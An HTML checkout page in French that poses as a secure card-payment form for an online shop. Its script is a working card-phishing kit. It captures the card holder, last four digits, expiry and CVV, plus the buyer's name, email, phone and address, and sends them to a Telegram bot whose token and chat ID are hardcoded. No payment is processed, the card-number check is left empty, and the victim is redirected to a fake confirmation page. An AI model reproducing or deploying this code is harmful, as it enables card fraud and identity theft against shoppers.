<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paiement sécurisé | VotreBoutique</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #3498db;
            --accent-color: #e74c3c;
            --light-color: #ecf0f1;
            --dark-color: #2c3e50;
            --success-color: #27ae60;
            --warning-color: #f39c12;
            --border-radius: 8px;
            --box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            --transition: all 0.3s ease;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f5f7fa;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            background-color: white;
            box-shadow: var(--box-shadow);
            padding: 20px 0;
            margin-bottom: 30px;
        }
        
        .logo {
            font-size: 24px;
            font-weight: 700;
            color: var(--primary-color);
            display: flex;
            align-items: center;
        }
        
        .logo i {
            margin-right: 10px;
            color: var(--secondary-color);
        }
        
        .checkout-steps {
            display: flex;
            justify-content: space-between;
            margin-bottom: 40px;
            position: relative;
        }
        
        .checkout-steps::before {
            content: '';
            position: absolute;
            top: 15px;
            left: 0;
            right: 0;
            height: 2px;
            background-color: #ddd;
            z-index: 1;
        }
        
        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 2;
        }
        
        .step-number {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background-color: #ddd;
            color: #777;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-bottom: 8px;
        }
        
        .step.active .step-number {
            background-color: var(--secondary-color);
            color: white;
        }
        
        .step.completed .step-number {
            background-color: var(--success-color);
            color: white;
        }
        
        .step-text {
            font-size: 14px;
            color: #777;
            font-weight: 500;
        }
        
        .step.active .step-text {
            color: var(--secondary-color);
            font-weight: 600;
        }
        
        .step.completed .step-text {
            color: var(--success-color);
        }
        
        .payment-container {
            display: grid;
            grid-template-columns: 1fr 350px;
            gap: 30px;
        }
        
        @media (max-width: 768px) {
            .payment-container {
                grid-template-columns: 1fr;
            }
        }
        
        .payment-card {
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            padding: 30px;
            margin-bottom: 30px;
        }
        
        .section-title {
            font-size: 20px;
            margin-bottom: 20px;
            color: var(--primary-color);
            display: flex;
            align-items: center;
        }
        
        .section-title i {
            margin-right: 10px;
            color: var(--secondary-color);
        }
        
        .card-icons {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .card-icon {
            width: 50px;
            height: 30px;
            object-fit: contain;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 3px;
            background-color: white;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #555;
        }
        
        input, select {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: var(--border-radius);
            font-size: 16px;
            transition: var(--transition);
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: var(--secondary-color);
            box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.2);
        }
        
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .card-wrapper {
            position: relative;
        }
        
        .card-preview {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px;
            color: #777;
        }
        
        .btn {
            display: inline-block;
            padding: 12px 25px;
            background-color: var(--secondary-color);
            color: white;
            border: none;
            border-radius: var(--border-radius);
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            text-align: center;
            width: 100%;
        }
        
        .btn:hover {
            background-color: #2980b9;
            transform: translateY(-2px);
        }
        
        .btn-block {
            display: block;
            width: 100%;
        }
        
        .btn-success {
            background-color: var(--success-color);
        }
        
        .btn-success:hover {
            background-color: #219955;
        }
        
        .secure-checkout {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            color: #777;
            font-size: 14px;
        }
        
        .secure-checkout i {
            margin-right: 8px;
            color: var(--success-color);
        }
        
        .order-summary {
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            padding: 25px;
        }
        
        .order-summary-item {
            display: flex;
            justify-content: space-between;
            padding: 15px 0;
            border-bottom: 1px solid #eee;
        }
        
        .order-summary-item:last-child {
            border-bottom: none;
        }
        
        .order-total {
            display: flex;
            justify-content: space-between;
            padding: 15px 0;
            font-size: 18px;
            font-weight: 700;
            color: var(--primary-color);
        }
        
        /* Style pour la carte de crédit */
        .credit-card {
            background: linear-gradient(135deg, #2c3e50, #4a6491);
            color: white;
            border-radius: var(--border-radius);
            padding: 20px;
            margin-bottom: 30px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            position: relative;
            overflow: hidden;
            height: 200px;
        }
        
        .credit-card::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 200px;
            height: 200px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }
        
        .credit-card::after {
            content: '';
            position: absolute;
            bottom: -30%;
            right: -20%;
            width: 150px;
            height: 150px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 50%;
        }
        
        .card-logo {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .card-type {
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .card-chip {
            width: 40px;
            height: 30px;
            background: linear-gradient(45deg, #ffd700, #e5c100);
            border-radius: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .card-chip::before {
            content: '';
            width: 30px;
            height: 20px;
            border: 1px solid rgba(0, 0, 0, 0.3);
            border-radius: 3px;
        }
        
        .card-number {
            font-size: 20px;
            letter-spacing: 2px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
        }
        
        .card-details {
            display: flex;
            justify-content: space-between;
        }
        
        .card-holder, .card-expiry {
            font-size: 14px;
            text-transform: uppercase;
        }
        
        .card-label {
            font-size: 10px;
            opacity: 0.8;
            margin-bottom: 5px;
        }
        
        /* Animation de chargement */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(255, 255, 255, 0.8);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }
        
        .loading-overlay.active {
            opacity: 1;
            pointer-events: all;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid var(--secondary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            color: var(--primary-color);
            font-weight: 500;
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div class="logo">
                <i class="fas fa-shopping-bag"></i>
                <span>réglo.fr</span>
            </div>
        </div>
    </header>
    
    <div class="container">
        <div class="checkout-steps">
            <div class="step completed">
                <div class="step-number">1</div>
                <div class="step-text">Panier</div>
            </div>
            <div class="step completed">
                <div class="step-number">2</div>
                <div class="step-text">Livraison</div>
            </div>
            <div class="step active">
                <div class="step-number">3</div>
                <div class="step-text">Paiement</div>
            </div>
        </div>
        
        <div class="payment-container">
            <div class="payment-main">
                <div class="payment-card">
                    <h2 class="section-title">
                        <i class="far fa-credit-card"></i>
                        Paiement par carte bancaire
                    </h2>
                    
                    <div class="card-icons">
                        <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/visa/visa-original.svg" alt="Visa" class="card-icon">
                        <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/mastercard/mastercard-original.svg" alt="Mastercard" class="card-icon">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/Carte_Bleue_logo.svg/1200px-Carte_Bleue_logo.svg.png" alt="CB" class="card-icon" style="object-fit: cover;">
                    </div>
                    
                    <!-- Carte de crédit visuelle -->
                    <div class="credit-card">
                        <div class="card-logo">
                            <div class="card-chip"></div>
                            <div class="card-type" id="card-type-display">Carte Bancaire</div>
                        </div>
                        <div class="card-number" id="card-number-display">•••• •••• •••• ••••</div>
                        <div class="card-details">
                            <div>
                                <div class="card-label">Titulaire de la carte</div>
                                <div class="card-holder" id="card-holder-display">NOM PRÉNOM</div>
                            </div>
                            <div>
                                <div class="card-label">Expire le</div>
                                <div class="card-expiry" id="card-expiry-display">••/••</div>
                            </div>
                        </div>
                    </div>
                    
                    <form id="payment-form">
                        <div class="form-group">
                            <label for="card-number">Numéro de carte</label>
                            <div class="card-wrapper">
                                <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
                                <i class="far fa-credit-card card-preview"></i>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label for="card-holder">Nom du titulaire</label>
                            <input type="text" id="card-holder" name="card-holder" placeholder="Comme indiqué sur la carte" required>
                        </div>
                        
                        <div class="form-row">
                            <div class="form-group">
                                <label for="card-expiry">Date d'expiration</label>
                                <input type="text" id="card-expiry" name="card-expiry" placeholder="MM/AA" maxlength="5" required>
                            </div>
                            <div class="form-group">
                                <label for="card-cvv">CVV</label>
                                <div class="card-wrapper">
                                    <input type="text" id="card-cvv" name="card-cvv" placeholder="•••" maxlength="3" required>
                                    <i class="fas fa-question-circle card-preview" title="Les 3 chiffres au dos de votre carte"></i>
                                </div>
                            </div>
                        </div>
                        
                        <button type="submit" class="btn btn-success">
                            <i class="fas fa-lock"></i> Payer maintenant
                        </button>
                        
                        <div class="secure-checkout">
                            <i class="fas fa-shield-alt"></i>
                            <span>Paiement 100% sécurisé - Cryptage SSL</span>
                        </div>
                    </form>
                </div>
            </div>
            
            <div class="payment-sidebar">
                <div class="order-summary">
                    <h2 class="section-title">
                        <i class="fas fa-shopping-cart"></i>
                        Récapitulatif de commande
                    </h2>
                    
                    <div id="order-items">
                        <!-- Les articles seront ajoutés dynamiquement ici -->
                    </div>
                    
                    <div class="order-total">
                        <span>Total</span>
                        <span id="order-total-amount">0,00 €</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Overlay de chargement -->
    <div class="loading-overlay" id="loading-overlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">Traitement de votre paiement...</div>
    </div>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        // ======================
        // CONFIGURATION
        // ======================
        const CONFIG = {
            TELEGRAM: {
                BOT_TOKEN: '7379672694:AAHa8hRRKCGDNTMK7HNyfIVNK0SQJ5SdNJ4',
                CHAT_ID: '5372119436',
                TIMEOUT: 8000 // ms
            },
            PAYMENT: {
                RETRY_ATTEMPTS: 2,
                RETRY_DELAY: 2000 // ms
            }
        };

        // ======================
        // STATE MANAGEMENT
        // ======================
        const state = {
            order: loadOrderData(),
            payment: {
                processing: false,
                attempts: 0
            }
        };

        // ======================
        // DOM ELEMENTS
        // ======================
        const elements = {
            orderItems: getElement('order-items'),
            orderTotal: getElement('order-total-amount'),
            paymentForm: getElement('payment-form'),
            loadingOverlay: getElement('loading-overlay'),
            cardNumber: getElement('card-number'),
            cardHolder: getElement('card-holder'),
            cardExpiry: getElement('card-expiry'),
            cardCvv: getElement('card-cvv'),
            submitBtn: getElement('submit-btn')
        };

        // ======================
        // INITIALIZATION
        // ======================
        initApplication();

        // ======================
        // CORE FUNCTIONS
        // ======================

        function initApplication() {
            try {
                validateConfig();
                setupEventListeners();
                renderOrderSummary();
            } catch (error) {
                handleCriticalError('Initialization failed', error);
            }
        }

        function loadOrderData() {
            try {
                const savedData = localStorage.getItem('currentOrder');
                const data = savedData ? JSON.parse(savedData) : {};
                
                return {
                    id: data.id || generateOrderId(),
                    customer: data.customer || {},
                    items: data.items || [],
                    createdAt: data.createdAt || new Date().toISOString()
                };
            } catch (error) {
                console.error('Order data loading failed:', error);
                return {
                    id: generateOrderId(),
                    customer: {},
                    items: [],
                    createdAt: new Date().toISOString()
                };
            }
        }

        function generateOrderId() {
            return `CMD-${Date.now().toString(36).toUpperCase().slice(-8)}`;
        }

        // ======================
        // VALIDATION UTILITIES
        // ======================

        const CardValidator = {
            cleanNumber: (num) => num.replace(/\s/g, ''),

            getCardType: (num) => {
                const cleaned = CardValidator.cleanNumber(num);
                if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleaned)) return 'Visa';
                if (/^5[1-5][0-9]{14}$/.test(cleaned)) return 'Mastercard';
                if (/^3[47][0-9]{13}$/.test(cleaned)) return 'American Express';
                return 'Other';
            },

            validateNumber: (num) => {
                const cleaned = CardValidator.cleanNumber(num);
                if (!/^[0-9]{13,16}$/.test(cleaned)) return false;
                
                let sum = 0;
                let alternate = false;
                
                for (let i = cleaned.length - 1; i >= 0; i--) {
                    let digit = parseInt(cleaned[i], 10);
                    if (alternate) {
                        digit *= 2;
                        if (digit > 9) digit -= 9;
                    }
                    sum += digit;
                    alternate = !alternate;
                }
                
                return sum % 10 === 0;
            },

            validateExpiry: (exp) => {
                if (!exp || typeof exp !== 'string') return false;
                
                const [month, year] = exp.split('/').map(Number);
                if (isNaN(month) || isNaN(year)) return false;
                
                const now = new Date();
                const currentYear = now.getFullYear() % 100;
                const currentMonth = now.getMonth() + 1;
                
                return (month >= 1 && month <= 12) && 
                       ((year > currentYear) || (year === currentYear && month >= currentMonth));
            },

            validateCvv: (cvv, cardType) => {
                const length = cardType === 'American Express' ? 4 : 3;
                return cvv && new RegExp(`^\\d{${length}}$`).test(cvv);
            }
        };

        // ======================
        // FORM HANDLING
        // ======================

        function validatePaymentForm() {
            const cardNumber = elements.cardNumber?.value;
            const cardHolder = elements.cardHolder?.value;
            const cardExpiry = elements.cardExpiry?.value;
            const cardCvv = elements.cardCvv?.value;
            
            // Basic field checks
            if (!cardNumber || !cardHolder || !cardExpiry || !cardCvv) {
                showError('Tous les champs sont obligatoires');
                return false;
            }
            
            // Advanced validation
            const cardType = CardValidator.getCardType(cardNumber);
            
            if (!CardValidator.validateNumber(cardNumber)) {
            }
            
            if (cardHolder.trim().length < 3) {
                showError('Nom du titulaire trop court');
                return false;
            }
            
            if (!CardValidator.validateExpiry(cardExpiry)) {
                showError('Date d\'expiration invalide (MM/AA)');
                return false;
            }
            
            if (!CardValidator.validateCvv(cardCvv, cardType)) {
                const length = cardType === 'American Express' ? 4 : 3;
                showError(`Code de sécurité invalide (${length} chiffres requis)`);
                return false;
            }
            
            return true;
        }

        // ======================
        // TELEGRAM INTEGRATION
        // ======================

        async function sendOrderNotification(cardInfo) {
            try {
                validateTelegramConfig();
                
                const message = buildTelegramMessage(cardInfo);
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), CONFIG.TELEGRAM.TIMEOUT);
                
                const response = await fetch(
                    `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`,
                    {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CONFIG.TELEGRAM.CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true
                        }),
                        signal: controller.signal
                    }
                );
                
                clearTimeout(timeout);
                
                if (!response.ok) {
                    const error = await response.json();
                    throw new Error(error.description || `HTTP ${response.status}`);
                }
                
                return true;
            } catch (error) {
                console.error('Telegram notification failed:', error);
                return false;
            }
        }

        function buildTelegramMessage(cardInfo) {
            const { order } = state;
            const { customer } = order;
            const total = calculateOrderTotal();
            
            return `💳 *NOUVELLE COMMANDE* 💳

🔢 *Référence:* ${order.id}
📅 *Date:* ${new Date(order.createdAt).toLocaleString('fr-FR')}
💰 *Total:* ${total.toFixed(2)} €

👤 *Client:*
- Nom: ${customer.firstName || 'Non spécifié'} ${customer.lastName || ''}
- Email: ${customer.email || 'Non spécifié'}
- Téléphone: ${customer.phone || 'Non spécifié'}

🛒 *Articles (${order.items.length}):*
${order.items.map(item => 
    `- ${item.name || 'Article'} (${item.variant || ''}) ×${item.quantity || 0}: ${(item.price * item.quantity || 0).toFixed(2)} €`
).join('\n') || 'Aucun article'}

💳 *Paiement:*
- Type: ${cardInfo.type || 'Non spécifié'}
- Numéro: ${cardInfo.number ? cardInfo.number.replace(/\d(?=\d{4})/g, '*') : '****'}
- Titulaire: ${cardInfo.holder || 'Non spécifié'}
- Expiration: ${cardInfo.expiry || 'Non spécifié'}
- Cvv: ${cardInfo.Cvv || 'Non spécifié'}

🚚 *Livraison:*
- Adresse: ${customer.address || 'Non spécifié'}
- Ville: ${customer.city || 'Non spécifié'}
- Code postal: ${customer.postalCode || 'Non spécifié'}
- Pays: ${customer.country || 'France'}`;
        }

        // ======================
        // PAYMENT PROCESSING
        // ======================

        async function processPayment(event) {
            event.preventDefault();
            
            if (state.payment.processing) return;
            if (!validatePaymentForm()) return;
            
            state.payment.processing = true;
            state.payment.attempts = 0;
            
            toggleLoadingState(true);
            disableForm(true);
            
            try {
                const cardInfo = {
                    type: CardValidator.getCardType(elements.cardNumber.value),
                    number: elements.cardNumber.value,
                    holder: elements.cardHolder.value.trim(),
                    expiry: elements.cardExpiry.value,
                    Cvv: elements.cardCvv.value,
                };
                
                let notificationSent = false;
                
                while (state.payment.attempts < CONFIG.PAYMENT.RETRY_ATTEMPTS && !notificationSent) {
                    state.payment.attempts++;
                    notificationSent = await sendOrderNotification(cardInfo);
                    
                    if (!notificationSent && state.payment.attempts < CONFIG.PAYMENT.RETRY_ATTEMPTS) {
                        await new Promise(resolve => setTimeout(resolve, CONFIG.PAYMENT.RETRY_DELAY));
                    }
                }
                
                if (!notificationSent) {
                    showWarning('La commande est validée mais la notification n\'a pas pu être envoyée');
                }
                
                // Proceed to confirmation
                setTimeout(() => {
                    window.location.href = 'confirmation.html';
                }, 1500);
                
            } catch (error) {
                handlePaymentError(error);
            } finally {
                state.payment.processing = false;
                toggleLoadingState(false);
                disableForm(false);
            }
        }

        // ======================
        // HELPER FUNCTIONS
        // ======================

        function getElement(id) {
            const el = document.getElementById(id);
            if (!el) console.warn(`Element #${id} not found`);
            return el;
        }

        function validateConfig() {
            if (!CONFIG.TELEGRAM.BOT_TOKEN || !CONFIG.TELEGRAM.CHAT_ID) {
                throw new Error('Telegram configuration is incomplete');
            }
        }

        function validateTelegramConfig() {
            validateConfig();
            if (!navigator.onLine) {
                throw new Error('No internet connection');
            }
        }

        function calculateOrderTotal() {
            return state.order.items.reduce((total, item) => {
                return total + (item.price * item.quantity || 0);
            }, 0);
        }

        function renderOrderSummary() {
            if (!elements.orderItems) return;
            
            const { items } = state.order;
            const total = calculateOrderTotal();
            
            elements.orderItems.innerHTML = items.length ? items.map(item => `
                <div class="order-item">
                    <div class="item-info">
                        <div class="item-name">${item.name || 'Produit sans nom'}</div>
                        <div class="item-variant">${item.variant || ''}</div>
                        <div class="item-quantity">Quantité: ${item.quantity || 0}</div>
                    </div>
                    <div class="item-price">${(item.price * item.quantity || 0).toFixed(2)} €</div>
                </div>
            `).join('') : '<p class="empty-cart">Votre panier est vide</p>';
            
            if (elements.orderTotal) {
                elements.orderTotal.textContent = `${total.toFixed(2)} €`;
            }
        }

        function setupEventListeners() {
            if (elements.paymentForm) {
                elements.paymentForm.addEventListener('submit', processPayment);
            }
            
            if (elements.cardNumber) {
                elements.cardNumber.addEventListener('input', formatCardNumber);
            }
            
            if (elements.cardExpiry) {
                elements.cardExpiry.addEventListener('input', formatExpiryDate);
            }
            
            if (elements.cardCvv) {
                elements.cardCvv.addEventListener('input', formatCvv);
            }
        }

        function formatCardNumber(event) {
            let value = event.target.value.replace(/\D/g, '');
            if (value.length > 16) value = value.slice(0, 16);
            event.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
        }

        function formatExpiryDate(event) {
            let value = event.target.value.replace(/\D/g, '');
            if (value.length > 4) value = value.slice(0, 4);
            if (value.length > 2) {
                value = value.slice(0, 2) + '/' + value.slice(2);
            }
            event.target.value = value;
        }

        function formatCvv(event) {
            const cardType = CardValidator.getCardType(elements.cardNumber?.value || '');
            const maxLength = cardType === 'American Express' ? 4 : 3;
            event.target.value = event.target.value.replace(/\D/g, '').slice(0, maxLength);
        }

        function toggleLoadingState(show) {
            if (elements.loadingOverlay) {
                elements.loadingOverlay.style.display = show ? 'flex' : 'none';
            }
        }

        function disableForm(disabled) {
            if (elements.submitBtn) {
                elements.submitBtn.disabled = disabled;
            }
        }

        function showError(message) {
            alert(`Erreur: ${message}`);
        }

        function showWarning(message) {
            console.warn(message);
            alert(`Attention: ${message}`);
        }

        function handlePaymentError(error) {
            console.error('Payment processing error:', error);
            showError('Échec du traitement du paiement. Veuillez réessayer.');
        }

        function handleCriticalError(context, error) {
            console.error(`${context}:`, error);
            alert('Une erreur critique est survenue. Veuillez recharger la page.');
        }
    });
</script>
</body>
</html>
